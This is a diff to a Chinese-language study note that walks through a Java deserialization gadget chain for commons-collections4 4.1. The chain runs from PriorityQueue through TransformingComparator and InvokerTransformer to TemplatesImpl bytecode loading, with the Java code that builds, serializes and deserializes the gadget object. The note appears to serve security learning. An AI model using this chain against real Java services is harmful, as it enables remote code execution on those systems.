@@ -12,6 +12,18 @@
 
 ## 2.调试分析
 
+在 commons-collections4:4.1 依赖中原来实现反序列化接口的类被修改了，只能寻找一些其它的类。在该链子中利用`PriorityQueue`作为入口类调用其的compare方法
+
+![image-20240418152428999](./img/image-20240418152428999.png)
+
+comparator变量可控，利用`TransformingComparator#compare(...)`，其中存在`transform(...)`方法，同样的`this.transformer`变量可控可序列化
+
+![image-20240418152638038](./img/image-20240418152638038.png)
+
+接着利用`InvokerTransformer#transform(...)`,在方法中存在反射调用，所以调用到`TemplatesImpl#newTransformer()`来触发字节码加载。
+
+代码构造如下：
+
 ```java
   TemplatesImpl templates = new TemplatesImpl();
   Class templatesImplClass = templates.getClass();
@@ -27,6 +39,7 @@
   Field tfactory = templatesImplClass.getDeclaredField("_tfactory");
   tfactory.setAccessible(true);
   tfactory.set(templates,new TransformerFactoryImpl());
+//============================================================================================================================================
 
   InvokerTransformer newTransformer = new InvokerTransformer<>("newTransformer", new Class[]{}, new Object[]{});
 
@@ -42,12 +55,11 @@
   queue.setAccessible(true);
   queue.set(priorityQueue,new Object[]{templates,templates});
 
-//        priorityQueue.add("2");
+
   byte[] serialize = serialize(priorityQueue);
   unSerialize(serialize);
 ```
 
+## 3.反序列化利用链图
 
-
-
-
+![image-20240418152058173](./img/image-20240418152058173.png)
